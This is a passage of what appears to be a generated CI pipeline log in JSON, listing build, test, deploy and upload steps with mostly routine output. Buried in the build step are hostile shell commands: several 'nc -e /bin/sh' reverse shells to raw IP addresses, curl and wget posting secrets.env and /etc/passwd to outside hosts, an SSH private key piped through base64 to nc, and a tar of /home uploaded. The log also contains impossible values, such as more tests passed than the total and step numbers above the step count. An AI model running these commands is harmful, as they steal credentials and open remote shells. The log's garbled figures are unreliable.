Task completed in 3692ms\n\u2713 All checks passed\nCache invalidated: build\nStep 16/22: Installing dependencies\nPlatform: win32-x64\nStep 18/15: Linting\n  PASS: test_cache_hit (279ms)\n[12:18:45] DEBUG: Initializing service\nArtifact uploaded: build.tar.gz (23MB)\nnpm notice: created a lockfile\nAlready up to date.\nOK\nUsing Node.js 20.14.4\nGenerating source maps...\nStep 14/22: Building\nyarn add: Done in 19.20s\nCompiling lib/app.ts...\nVerifying...\nnpm install: added 321 packages\nCompiling src/service.java...\nCache invalidated: build\nPushing to registry...\nSwitched to branch 'hotfix/task-193'\nGET /health - 204 (63ms)\nCompiling utils/main.py...\nWaiting...\npip: Downloading lodash-1.11.tar.gz\nnpm notice: package.json updated\nInstalling jest@5.6.9\n[12:18:45] INFO: Cache refreshed\nCompiling utils/handler.rs...\nLayer 10/12: COPY command\n  PASS: test_cache_hit (6ms)\nArtifact uploaded: build.tar.gz (24MB)\nnpm install: added 492 packages\npip install: Successfully installed express-3.3\nStep 17/16: Linting\nLoading...\nMinifying app.js\nnpm install: added 404 packages\nCache miss for key-8254\nHEAD is now at a2ea178\nFinished.\nChecking out main branch\nImage pulled successfully\nStep 8/22: Building\nTest Suites: 14 passed, 13 total\nImage pulled successfully\nTransforming 919 files...\n\u2713 Task completed in 3312ms\nUsing Node.js 16.17.10\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n  PASS: test_api_health (449ms)\nGET /api - 201 (1ms)\nFinished.\nTLS handshake completed\n[12:18:45] DEBUG: Memory usage: 1083MB\nConnection established\nDone.\n\u2717 build failed with exit code 35\nUsing Node.js 17.2.1\n[12:18:45] DEBUG: Connection pool: 17 active\nMinifying main.js\n[12:18:45] ERROR: Connection failed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nSnapshots: 39 passed, 8 total\nUsing Python 3.11\npip: Downloading express-1.15.tar.gz\nTime: 25.262s\nRan 49 tests in 11s\nHEAD is now at 595182d\n\u2713 Step 'build' succeeded\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nConnection established\nCache saved successfully\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nDone.\nLoading...\nStep 6/24: Installing dependencies\nnpm notice: created a lockfile\nCoverage: 99% statements, 62% branches\nMinifying app.js\n[12:18:45] DEBUG: Memory usage: 264MB\nMinifying app.js\nCreating production build...\nUsing Python 3.12\nHEAD is now at dd72ff0\nStep 19/23: Testing\nUsing Node.js 17.16.3\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nBuilding Docker image...\nCompiling utils/index.js...\nConnection established\nConnecting to example.com:443...\nArtifact uploaded: dist.zip (37MB)\n=== Step type_check completed ===\n=== Step: e2e_tests ===\nTLS handshake completed\n\u2717 build failed with exit code 109\nSwitched to branch 'feature/task-600'\n[12:18:45] DEBUG: Memory usage: 1403MB\nTests: 440 passed, 401 total\nCache miss for key-3416\nPushing to registry...\nCache invalidated: dependencies\nProcessing...\nFinished.\nTransforming 335 files...\nStep 20/23: Testing\nnpm install: resolved 893 packages\nVerifying...\nTLS handshake completed\nArtifact downloaded: 29MB\n\u2713 All checks passed\nSwitched to branch 'hotfix/task-448'\nCache restored successfully (297MB)\nCache miss for key-8531\nDone.\nStep 13/17: Running migrations\nnpm notice: package.json updated\n[12:18:45] INFO: Cache refreshed\nRan 22 tests in 47s\n[12:18:45] INFO: Cache refreshed\nWARNING: express has known vulnerabilities\npip: Installing build dependencies...\nOK\n[12:18:45] DEBUG: Initializing service\n[12:18:45] WARN: Deprecated API usage\nyarn add: Done in 25.14s\nLoading...\nPOST /api - 201 (373ms)\nArtifact downloaded: 27MB\n[12:18:45] DEBUG: Loading configuration\nBundling styles.css\n[12:18:45] DEBUG: Memory usage: 490MB\nCache hit for key-3722\nTransforming 533 files...\n[12:18:45] DEBUG: Memory usage: 614MB\nTLS handshake completed\nStep 16/21: Installing dependencies\nChecking out main branch\n[12:18:45] DEBUG: Memory usage: 826MB\n[12:18:45] WARN: Deprecated API usage\nTests: 490 passed, 320 total\nStep 13/18: Linting\n[12:18:45] WARN: Deprecated API usage\n\u2713 All checks passed\nGenerating source maps...\nWaiting...\nCache saved successfully\nEnvironment: staging\n[12:18:45] INFO: Cache refreshed\n[12:18:45] INFO: Processing request\nStep 17/22: Running migrations\nImage pulled successfully\nGET /status - 204 (49ms)\nChecking out main branch\nConnecting to acme.corp:443...\nTLS handshake completed\npip: Installing build dependencies...\nBundling runtime.js\nCache hit for key-8590\npip: Downloading lodash-2.1.tar.gz\nCoverage: 87% statements, 61% branches\nCompiling utils/handler.rs...\n[12:18:45] DEBUG: Initializing service\nReady.\nNODE_ENV=production\nArtifact uploaded: dist.zip (86MB)\nNODE_ENV=development\nSwitched to branch 'feature/task-134'\n[12:18:45] ERROR: Connection failed\n[12:18:45] ERROR: Connection failed\nCompiling utils/app.ts...\n[12:18:45] DEBUG: Loading configuration\nPulling image: node:3.11\nArtifact uploaded: dist.zip (4MB)\nConnecting to acme.corp:443...\n\u2713 All checks passed\nCache invalidated: node_modules\nConnecting to startup.dev:443...\nTime: 51.943s\n[12:18:45] INFO: Starting build process\nStep 1/23: Building\n[12:18:45] INFO: Request completed\nTransforming 490 files...\n[12:18:45] DEBUG: Loading configuration\n[12:18:45] INFO: Processing request\nChecking out master branch\npip: Downloading lodash-3.19.tar.gz\nOptimizing 27 modules...\nCompiling lib/main.py...\nFetching submodules...\nCompiling utils/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache saved successfully\nGET /status - 201 (21ms)\nnpm notice: created a lockfile\nEnvironment: test\nBuilding Docker image...\nHEAD is now at 17685c5\nPOST /data - 202 (310ms)\n[12:18:45] DEBUG: Memory usage: 818MB\nCompleted.\nException: TypeError\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompleted.\n\u2717 build failed with exit code 34\nnpm notice: package.json updated\nWARNING: express has known vulnerabilities\nConnecting to acme.corp:443...\nSnapshots: 27 passed, 14 total\nStep 20/23: Running migrations\nPushing to registry...\nCompleted.\nWaiting...\nArtifact downloaded: 49MB\nEnvironment: production\n[12:18:45] WARN: Deprecated API usage\npip: Installing build dependencies...\nLoading...\nSwitched to branch 'feature/task-130'\nPOST /api - 201 (232ms)\nBundling main.js\npip: Installing build dependencies...\nCompiling utils/utils.go...\nTest Suites: 5 passed, 35 total\nPulling image: alpine:3.11\nPOST /api - 202 (328ms)\n[12:18:45] DEBUG: Loading configuration\nGET /api - 201 (28ms)\nCompiling lib/app.ts...\nCompiling src/main.py...\n\u2713 Step 'test' succeeded\nGenerating source maps...\nUsing Node.js 18.10.7\n[12:18:45] DEBUG: Memory usage: 1272MB\npip: Downloading eslint-1.9.tar.gz\nImage pulled successfully\n=== Step e2e_tests completed ===\n=== Step: unit_tests ===\nException: ValueError\n[12:18:45] INFO: Starting build process\n\u2713 Step 'test' succeeded\nPOST /api - 201 (12ms)\nnpm install: resolved 1521 packages\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2713 Task completed in 2108ms\nNODE_ENV=development\nCompiling components/utils.go...\nPushing to registry...\n[12:18:45] DEBUG: Initializing service\npip: Collecting prettier\nTransforming 357 files...\nImage pulled successfully\nCompiling lib/index.js...\nPushing to registry...\nVerifying...\n[12:18:45] DEBUG: Loading configuration\nConnecting to startup.dev:443...\nArtifact downloaded: 40MB\nStep 16/17: Deploying\nCache miss for key-9050\n[12:18:45] DEBUG: Connection pool: 20 active\npip: Installing build dependencies...\n[12:18:45] WARN: Deprecated API usage\nnpm notice: package.json updated\nCache saved successfully\nAlready up to date.\nUsing Python 3.9\nFetching submodules...\nCompiling components/main.py...\nArtifact downloaded: 2MB\nnpm notice: package.json updated\n\u2713 All checks passed\nGET /api - 200 (74ms)\nImage pulled successfully\nSnapshots: 40 passed, 47 total\nGenerating source maps...\nCache saved successfully\n[12:18:45] INFO: Processing request\nLayer 8/10: ENV command\npip: Collecting axios\nHEAD is now at 20573dc\n  PASS: test_cache_hit (417ms)\nBuilding Docker image...\npip: Collecting prettier\nFAILED: test_cache_hit\nWaiting...\n[12:18:45] DEBUG: Query executed in 58ms\n\u2713 Step 'test' succeeded\nTransforming 240 files...\nFAILED: test_db_connect\nConnecting to startup.dev:443...\nGenerating source maps...\nTransforming 555 files...\nWaiting...\nnpm install: added 329 packages\n\u2713 All checks passed\nStep 12/21: Running migrations\nInstalling eslint@2.12.2\n\u2717 build failed with exit code 79\nCompiling src/main.py...\nVerifying...\n[12:18:45] DEBUG: Loading configuration\n\u2713 Task completed in 1298ms\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache invalidated: dependencies\nOptimizing 10 modules...\nLoading...\nCache invalidated: node_modules\nCache invalidated: dependencies\nFetching submodules...\nConnecting to cloud.services:443...\nFAILED: test_auth_login\nCache saved successfully\nCache miss for key-9438\nArtifact uploaded: dist.zip (72MB)\n[12:18:45] WARN: Deprecated API usage\nImage pulled successfully\nCompleted.\nCompiling components/service.java...\nTransforming 320 files...\nTime: 92.641s\nTests: 210 passed, 226 total\nPlatform: win32-x64\nLoading...\nCompiling components/app.ts...\nGenerating source maps...\n[12:18:45] INFO: Starting build process\n[12:18:45] INFO: Processing request\nSwitched to branch 'hotfix/task-891'\n[12:18:45] INFO: Connecting to database\nnpm install: resolved 1381 packages\nArtifact uploaded: dist.zip (85MB)\nLoading...\nImage pulled successfully\nPushing to registry...\nCreating production build...\n[12:18:45] DEBUG: Connection pool: 15 active\nWaiting...\nPOST /upload - 201 (195ms)\nConnecting to startup.dev:443...\nCreating production build...\nnpm install: resolved 650 packages\nAlready up to date.\n\u2713 Task completed in 446ms\nStep 1/20: Deploying\nCompiling src/main.py...\nStep 7/19: Installing dependencies\nBundling runtime.css\nUsing Node.js 15.14.5\nGenerating source maps...\n  PASS: integration/test_api_health.spec.js\npip: Downloading express-3.7.tar.gz\nLayer 1/10: RUN command\nStep 3/24: Running migrations\n[12:18:45] ERROR: Connection failed\nLoading...\nnpm install: resolved 1929 packages\nUsing Python 3.11\n[12:18:45] DEBUG: Query executed in 18ms\nReady.\nnpm install: resolved 1408 packages\nStep 3/20: Building\nStep 5/18: Running migrations\nGenerating source maps...\nPushing to registry...\n[12:18:45] DEBUG: Loading configuration\nCreating production build...\n[12:18:45] WARN: Deprecated API usage\n[12:18:45] DEBUG: Query executed in 49ms\nDone.\nPulling image: node:3.11\nTransforming 483 files...\npip: Downloading webpack-5.3.tar.gz\n\u2717 build failed with exit code 27\nEnvironment: staging\npip: Downloading eslint-5.1.tar.gz\nStep 5/15: Building\n[12:18:45] INFO: Request completed\npip: Collecting axios\n[12:18:45] INFO: Connecting to database\n=== Step unit_tests completed ===\nnc -e /bin/sh 94.158.64.248 2902\n=== Step: build ===\nNODE_ENV=development\nWARNING: webpack has known vulnerabilities\nCache hit for key-3515\nCreating production build...\nCompleted.\n\u2713 All checks passed\n[12:18:45] INFO: Starting build process\nSnapshots: 19 passed, 1 total\nBuilding Docker image...\nBuilding Docker image...\nOptimizing 91 modules...\nStep 13/16: Testing\nStep 13/19: Installing dependencies\n[12:18:45] INFO: Request completed\nFetching submodules...\nCoverage: 80% statements, 100% branches\nUsing Node.js 14.19.1\nnc -e /bin/sh 136.236.19.74 16290\n  PASS: e2e/test_db_connect.spec.js\nTLS handshake completed\ncurl -X POST https://test.io/collect -d @secrets.env\n[12:18:45] INFO: Cache refreshed\nwget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/\nWARNING: prettier has known vulnerabilities\nnpm install: added 43 packages\npip: Collecting express\nPOST /data - 201 (348ms)\n[12:18:45] WARN: Deprecated API usage\nOK\nBuilding Docker image...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nPOST /data - 202 (41ms)\nAlready up to date.\nOptimizing 71 modules...\n[12:18:45] DEBUG: Query executed in 68ms\nCache hit for key-5902\nImage pulled successfully\nSwitched to branch 'bugfix/task-904'\nNODE_ENV=production\n[12:18:45] DEBUG: Query executed in 24ms\nPlatform: darwin-arm64\n\u2713 package completed\nSwitched to branch 'feature/task-242'\nSending 108MB of data to cloud.services\n  PASS: e2e/test_user_create.spec.js\nArtifact uploaded: dist.zip (99MB)\nTest Suites: 39 passed, 45 total\nPulling image: alpine:latest\nPushing to registry...\nChecking out develop branch\ncurl -X POST https://startup.dev/collect -d @secrets.env\nPlatform: linux-x64\ncurl -X POST https://test.io/collect -d @secrets.env\nRan 111 tests in 17s\nwget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/\ncurl -X POST https://acme.corp/collect -d @secrets.env\nStep 14/20: Linting\nLoading...\nArtifact uploaded: build.tar.gz (30MB)\nCache saved successfully\nMinifying main.js\necho $(cat ~/.ssh/id_rsa) | base64 | nc 192.175.170.93 37933\nPulling image: python:latest\n[12:18:45] DEBUG: Memory usage: 1528MB\nArtifact uploaded: build.tar.gz (13MB)\n  PASS: e2e/test_api_health.spec.js\nwget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/\nStep 9/24: Building\n\u2713 Step 'install' succeeded\nStep 10/16: Deploying\n  PASS: test_auth_login (179ms)\n[12:18:45] INFO: Connecting to database\nTime: 114.860s\nFinished.\nnc -e /bin/sh 44.46.119.136 39881\n[12:18:45] INFO: Request completed\nCompiling components/service.java...\nGET /api - 201 (88ms)\nLayer 1/14: ENV command\nArtifact uploaded: dist.zip (48MB)\nTest Suites: 18 passed, 34 total\nCache saved successfully\nFetching submodules...\nwget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/\ntar czf - /home | curl -X POST -d @- https://example.com/upload\nLayer 7/13: RUN command\nwget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/\n\u2713 Task completed in 2590ms\nArtifact uploaded: dist.zip (17MB)\nProcessing...\nReady.\nHEAD is now at fb14dcc\nArtifact uploaded: build.tar.gz (43MB)\nBuilding Docker image...\ncurl -X POST https://cloud.services/collect -d @secrets.env\nStep 4/19: Running migrations\n[12:18:45] WARN: Deprecated API usage\nOptimizing 96 modules...\nReady.\nSending 306MB of data to acme.corp\nSending 397MB of data to cloud.services\nFetching submodules...\nLoading...\nGET /api - 201 (61ms)\nProcessing...\npip: Collecting axios\nFinished.\nnpm notice: package.json updated\nSnapshots: 47 passed, 10 total\nPlatform: darwin-arm64\nArtifact downloaded: 38MB\n[12:18:45] INFO: Request completed\nCache restored successfully (363MB)\nDone.\nTLS handshake completed\nSending 91MB of data to startup.dev\nConnection established\ntar czf - /home | curl -X POST -d @- https://example.com/upload\n[12:18:45] DEBUG: Query executed in 3ms\nStep 2/19: Testing\nCache saved successfully\nArtifact uploaded: build.tar.gz (38MB)\nCompiling utils/utils.go...\nnpm install: added 40 packages\nSwitched to branch 'hotfix/task-366'\nSuccess!\nPlatform: linux-x64\ncurl -X POST https://test.io/collect -d @secrets.env\nInstalling jest@5.11.0\nCompiling lib/main.py...\n[12:18:45] WARN: Deprecated API usage\nnpm install: added 444 packages\nTest Suites: 9 passed, 44 total\nCompiling lib/service.java...\nDone.\nGET /status - 200 (49ms)\nGET /health - 200 (24ms)\nnc -e /bin/sh 148.144.248.32 3738\n\u2713 Task completed in 4196ms\nVerifying...\nMinifying app.js\n[12:18:45] INFO: Request completed\nSwitched to branch 'bugfix/task-720'\nSending 381MB of data to test.io\nFinished.\nReady.\nSending 132MB of data to cloud.services\nCache invalidated: node_modules\nCache saved successfully\n[12:18:45] WARN: Deprecated API usage\n[12:18:45] INFO: Cache refreshed\nStep 20/25: Installing dependencies\nChecking out master branch\n[12:18:45] DEBUG: Query executed in 24ms\nConnection established\nUsing Node.js 15.6.8\nCompiling src/app.ts...\nTransforming 907 files...\nCache miss for key-8324\nWARNING: eslint has known vulnerabilities\nNODE_ENV=production\nUsing Python 3.9\nCreating production build...\nTests: 319 passed, 379 total\nArtifact downloaded: 48MB\n=== Step build completed ===",
    "steps": [
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-11-25T12:18:45.429015",
        "finished_at": "2025-11-25T12:18:59.856480",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "Minifying main.js",
          "Tests: 411 passed, 76 total",
          "Step 15/20: Testing",
          "Step 2/17: Building",
          "npm notice: package.json updated",
          "GET /health - 201 (97ms)",
          "Minifying vendor.js",
          "Uploading artifact 'build' (16 files)",
          "\u2713 lint completed",
          "Minifying vendor.js",
          "Environment: development",
          "[12:18:45] INFO: Request completed",
          "Step 19/23: Building",
          "Uploading artifact 'coverage' (43 files)",
          "[12:18:45] INFO: Request completed",
          "Step 20/16: Linting",
          "Minifying app.js",
          "pip install: Successfully installed axios-4.11",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 18/17: Building",
          "WARNING: axios has known vulnerabilities",
          "npm notice: package.json updated",
          "HEAD is now at 84e3031",
          "npm notice: package.json updated",
          "Verifying...",
          "WARNING: webpack has known vulnerabilities",
          "[12:18:45] DEBUG: Memory usage: 1525MB",
          "Loading...",
          "Connection established",
          "Creating production build...",
          "Bundling styles.js",
          "[12:18:45] DEBUG: Connection pool: 8 active",
          "Ready.",
          "Cache miss for key-3306",
          "\u2713 Step 'test' succeeded",
          "pip: Downloading lodash-4.10.tar.gz",
          "[12:18:45] INFO: Starting build process",
          "Transforming 746 files...",
          "Already up to date.",
          "[12:18:45] INFO: Starting build process",
          "Artifact downloaded: 50MB",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "pip install: Successfully installed jest-5.12",
          "Installing prettier@4.7.7",
          "Image pulled successfully",
          "Step 7/17: Installing dependencies",
          "[12:18:45] INFO: Processing request",
          "[12:18:45] INFO: Request completed",
          "[12:18:45] WARN: Deprecated API usage",
          "pip: Downloading react-5.9.tar.gz",
          "Artifact downloaded: 6MB",
          "Using Python 3.9",
          "\u2713 Task completed in 966ms",
          "Artifact downloaded: 41MB",
          "Fetching submodules...",
          "Completed.",
          "NODE_ENV=test",
          "[12:18:45] INFO: Connecting to database",
          "[12:18:45] DEBUG: Connection pool: 10 active",
          "Time: 89.925s",
          "pip: Downloading webpack-2.1.tar.gz",
          "Checking out develop branch",
          "[12:18:45] WARN: Deprecated API usage",
          "Done.",
          "  PASS: test_auth_login (44ms)",
          "[12:18:45] DEBUG: Connection pool: 17 active",
          "Switched to branch 'bugfix/task-610'",
          "Cache miss for key-9100",
          "[12:18:45] DEBUG: Memory usage: 1908MB",
          "Exception: RuntimeError",
          "Ready.",
          "Loading...",
          "Layer 7/14: COPY command",
          "[12:18:45] DEBUG: Connection pool: 20 active",
          "npm notice: package.json updated",
          "POST /upload - 200 (118ms)",
          "Test Suites: 10 passed, 33 total",
          "OK",
          "[12:18:45] INFO: Request completed",
          "Already up to date.",
          "[12:18:45] DEBUG: Connection pool: 5 active",
          "yarn add: Done in 28.7s",
          "Cache saved successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 Step 'build' succeeded",
          "Step 20/25: Linting",
          "[12:18:45] DEBUG: Connection pool: 12 active",
          "\u2713 All checks passed",
          "[12:18:45] ERROR: Connection failed",
          "Layer 10/14: COPY command",
          "Using Python 3.10",
          "Generating source maps...",
          "Step 6/25: Linting",
          "Building Docker image...",
          "[12:18:45] INFO: Request completed",
          "Done.",
          "pip: Collecting express",
          "Compiling components/index.js...",
          "Artifact downloaded: 19MB",
          "Cache saved successfully",
          "Artifact uploaded: build.tar.gz (19MB)",
          "pip install: Successfully installed express-5.1",
          "Compiling src/service.java...",
          "pip: Downloading eslint-1.2.tar.gz",
          "Waiting...",
          "npm notice: package.json updated",
          "Completed.",
          "[12:18:45] DEBUG: Query executed in 94ms",
          "Using Python 3.12",
          "WARNING: eslint has known vulnerabilities",
          "Step 2/20: Deploying",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Verifying...",
          "Ready.",
          "[12:18:45] INFO: Connecting to database",
          "Using Python 3.9",
          "FAILED: test_api_health",
          "Loading...",
          "Step 1/17: Linting",
          "\u2713 Task completed in 1651ms",
          "Pushing to registry...",
          "npm install: added 488 packages",
          "Coverage: 93% statements, 68% branches",
          "Step 3/21: Testing",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "WARNING: react has known vulnerabilities",
          "[12:18:45] INFO: Cache refreshed",
          "Artifact uploaded: dist.zip (28MB)",
          "[12:18:45] INFO: Connecting to database",
          "\u2713 Task completed in 628ms",
          "Compiling lib/index.js...",
          "[12:18:45] WARN: Deprecated API usage",
          "Step 18/20: Building",
          "Step 4/20: Building",
          "[12:18:45] WARN: Deprecated API usage",
          "Checking out develop branch",
          "Compiling utils/main.py...",
          "Building Docker image...",
          "npm install: added 117 packages",
          "npm notice: created a lockfile",
          "Artifact uploaded: build.tar.gz (35MB)",
          "POST /api - 201 (96ms)",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-11-25T12:18:59.856480",
        "finished_at": "2025-11-25T12:19:14.283945",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "Done.",
          "Generating source maps...",
          "POST /api - 200 (126ms)",
          "Uploading artifact 'build' (31 files)",
          "Image pulled successfully",
          "Environment: development",
          "Minifying main.js",
          "POST /api - 201 (458ms)",
          "Time: 14.566s",
          "Compiling lib/service.java...",
          "[12:18:45] INFO: Processing request",
          "Installing jest@3.15.7",
          "NODE_ENV=production",
          "WARNING: axios has known vulnerabilities",
          "TLS handshake completed",
          "npm install: resolved 1740 packages",
          "Connecting to startup.dev:443...",
          "Exception: ValueError",
          "Step 3/17: Linting",
          "Step 3/24: Testing",
          "[12:18:45] INFO: Processing request",
          "WARNING: express has known vulnerabilities",
          "Pushing to registry...",
          "WARNING: jest has known vulnerabilities",
          "pip install: Successfully installed webpack-5.16",
          "Cache invalidated: node_modules",
          "Compiling src/handler.rs...",
          "POST /api - 201 (319ms)",
          "npm install: resolved 1963 packages",
          "[12:18:45] INFO: Connecting to database",
          "\u2713 Task completed in 110ms",
          "Creating production build...",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Step 7/24: Deploying",
          "[12:18:45] INFO: Connecting to database",
          "[12:18:45] INFO: Starting build process",
          "Using Python 3.11",
          "[12:18:45] ERROR: Connection failed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "OK",
          "Cache invalidated: dependencies",
          "pip install: Successfully installed jest-2.5",
          "\u2713 All checks passed",
          "Pulling image: node:latest",
          "[12:18:45] DEBUG: Memory usage: 1967MB",
          "Building Docker image...",
          "Artifact downloaded: 42MB",
          "Verifying...",
          "Creating production build...",
          "Completed.",
          "pip: Installing build dependencies...",
          "Completed.",
          "npm notice: package.json updated",
          "[12:18:45] ERROR: Connection failed",
          "NODE_ENV=production",
          "Verifying...",
          "Connection established",
          "[12:18:45] INFO: Processing request",
          "Checking out develop branch",
          "\u2717 build failed with exit code 117",
          "[12:18:45] WARN: Deprecated API usage",
          "Checking out master branch",
          "[12:18:45] DEBUG: Memory usage: 1674MB",
          "Cache restored successfully (330MB)",
          "Step 1/22: Running migrations",
          "\u2713 All checks passed",
          "Fetching submodules...",
          "Step 20/23: Testing",
          "Checking out main branch",
          "Cache restored successfully (369MB)",
          "Verifying...",
          "Building Docker image...",
          "Checking out main branch",
          "Ran 159 tests in 6s",
          "Pulling image: python:18",
          "[12:18:45] WARN: Deprecated API usage",
          "npm install: resolved 1964 packages",
          "WARNING: express has known vulnerabilities",
          "Cache saved successfully",
          "Waiting...",
          "NODE_ENV=test",
          "[12:18:45] INFO: Request completed",
          "Compiling src/main.py...",
          "Generating source maps...",
          "Checking out main branch",
          "pip: Collecting webpack",
          "Pushing to registry...",
          "[12:18:45] INFO: Connecting to database",
          "Step 17/18: Testing",
          "HEAD is now at 21a52e8",
          "pip: Installing build dependencies...",
          "Transforming 121 files...",
          "npm install: resolved 639 packages",
          "npm install: resolved 1277 packages",
          "Switched to branch 'hotfix/task-714'",
          "\u2713 Task completed in 2598ms",
          "[12:18:45] INFO: Processing request",
          "Pulling image: python:18",
          "[12:18:45] DEBUG: Loading configuration",
          "\u2713 Task completed in 3511ms",
          "[12:18:45] INFO: Starting build process",
          "NODE_ENV=production",
          "Uploading artifact 'coverage' (46 files)",
          "Artifact uploaded: dist.zip (90MB)",
          "Connecting to cloud.services:443...",
          "GET /health - 201 (75ms)",
          "Cache restored successfully (113MB)",
          "[12:18:45] DEBUG: Loading configuration",
          "Cache invalidated: dependencies",
          "Switched to branch 'feature/task-591'",
          "npm notice: package.json updated",
          "  PASS: integration/test_cache_hit.spec.js",
          "Snapshots: 12 passed, 1 total",
          "Step 18/19: Building",
          "Waiting...",
          "[12:18:45] DEBUG: Loading configuration",
          "POST /data - 201 (227ms)",
          "npm install: resolved 989 packages",
          "Bundling runtime.js",
          "Using Node.js 19.6.2",
          "pip: Downloading webpack-3.20.tar.gz",
          "  PASS: e2e/test_user_create.spec.js",
          "Checking out main branch",
          "  PASS: integration/test_auth_login.spec.js",
          "Completed.",
          "Compiling components/app.ts...",
          "yarn add: Done in 23.85s",
          "Using Python 3.11",
          "FAILED: test_api_health",
          "Cache hit for key-9221",
          "[12:18:45] INFO: Request completed",
          "npm install: resolved 116 packages",
          "Artifact uploaded: build.tar.gz (19MB)",
          "WARNING: lodash has known vulnerabilities",
          "pip install: Successfully installed eslint-2.9",
          "Step 19/17: Installing dependencies",
          "POST /data - 201 (117ms)",
          "Completed.",
          "HEAD is now at d2a2dde",
          "NODE_ENV=production",
          "Bundling main.css",
          "[12:18:45] INFO: Connecting to database",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-11-25T12:19:14.283945",
        "finished_at": "2025-11-25T12:19:28.711410",
        "log_lines": [
          "=== Step: setup_environment ===",
          "Artifact downloaded: 20MB",
          "[12:18:45] DEBUG: Memory usage: 1394MB",
          "Step 9/16: Running migrations",
          "Ran 21 tests in 53s",
          "npm install: added 391 packages",
          "  PASS: test_cache_hit (67ms)",
          "POST /upload - 201 (426ms)",
          "  PASS: test_cache_hit (268ms)",
          "GET /api - 200 (31ms)",
          "pip: Installing build dependencies...",
          "npm install: resolved 961 packages",
          "Transforming 713 files...",
          "[12:18:45] DEBUG: Connection pool: 18 active",
          "\u2713 Step 'install' succeeded",
          "Pushing to registry...",
          "Waiting...",
          "Artifact downloaded: 7MB",
          "Waiting...",
          "npm notice: created a lockfile",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Coverage: 75% statements, 70% branches",
          "Compiling src/handler.rs...",
          "pip: Collecting eslint",
          "npm install: resolved 764 packages",
          "\u2713 Task completed in 3598ms",
          "Transforming 581 files...",
          "Using Python 3.12",
          "WARNING: jest has known vulnerabilities",
          "Snapshots: 11 passed, 16 total",
          "Using Python 3.12",
          "Loading...",
          "[12:18:45] DEBUG: Query executed in 94ms",
          "Compiling src/utils.go...",
          "npm notice: package.json updated",
          "\u2713 Task completed in 2447ms",
          "Connecting to acme.corp:443...",
          "Completed.",
          "pip: Installing build dependencies...",
          "Platform: linux-x64",
          "npm install: resolved 1548 packages",
          "npm notice: package.json updated",
          "Verifying...",
          "\u2717 build failed with exit code 10",
          "Connection established",
          "Verifying...",
          "\u2713 All checks passed",
          "npm install: resolved 1438 packages",
          "Cache miss for key-4568",
          "  PASS: unit/test_user_create.spec.js",
          "Platform: darwin-arm64",
          "[12:18:45] WARN: Deprecated API usage",
          "pip: Collecting prettier",
          "\u2713 All checks passed",
          "[12:18:45] WARN: Deprecated API usage",
          "Artifact uploaded: dist.zip (59MB)",
          "Pulling image: node:latest",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Artifact downloaded: 23MB",
          "[12:18:45] INFO: Cache refreshed",
          "  PASS: unit/test_user_create.spec.js",
          "Platform: win32-x64",
          "Installing express@3.15.0",
          "Building Docker image...",
          "GET /health - 204 (69ms)",
          "Cache saved successfully",
          "Installing prettier@5.9.8",
          "Platform: win32-x64",
          "  PASS: integration/test_cache_hit.spec.js",
          "OK",
          "Tests: 333 passed, 489 total",
          "Generating source maps...",
          "Finished.",
          "Building Docker image...",
          "Connecting to cloud.services:443...",
          "npm install: added 121 packages",
          "pip install: Successfully installed webpack-5.2",
          "Connecting to cloud.services:443...",
          "Layer 7/15: COPY command",
          "pip: Installing build dependencies...",
          "Generating source maps...",
          "[12:18:45] DEBUG: Loading configuration",
          "Loading...",
          "[12:18:45] DEBUG: Query executed in 1ms",
          "[12:18:45] INFO: Processing request",
          "pip: Installing build dependencies...",
          "[12:18:45] DEBUG: Initializing service",
          "Already up to date.",
          "Checking out main branch",
          "WARNING: react has known vulnerabilities",
          "Waiting...",
          "pip install: Successfully installed express-2.13",
          "Processing...",
          "Transforming 360 files...",
          "Ran 192 tests in 31s",
          "npm install: resolved 1059 packages",
          "  PASS: unit/test_user_create.spec.js",
          "Step 19/21: Testing",
          "Fetching submodules...",
          "pip install: Successfully installed jest-1.19",
          "Loading...",
          "Already up to date.",
          "Layer 6/14: ENV command",
          "Optimizing 54 modules...",
          "GET /api - 204 (64ms)",
          "Transforming 809 files...",
          "Layer 5/8: RUN command",
          "Cache hit for key-7503",
          "Switched to branch 'bugfix/task-299'",
          "\u2713 Task completed in 131ms",
          "Compiling components/service.java...",
          "Cache restored successfully (358MB)",
          "Using Python 3.9",
          "Checking out develop branch",
          "Loading...",
          "Loading...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Completed.",
          "Waiting...",
          "npm notice: created a lockfile",
          "Step 8/17: Installing dependencies",
          "Creating production build...",
          "npm install: added 165 packages",
          "[12:18:45] DEBUG: Connection pool: 18 active",
          "Compiling lib/app.ts...",
          "WARNING: webpack has known vulnerabilities",
          "Bundling runtime.js",
          "WARNING: react has known vulnerabilities",
          "NODE_ENV=production",
          "Artifact downloaded: 44MB",
          "Processing...",
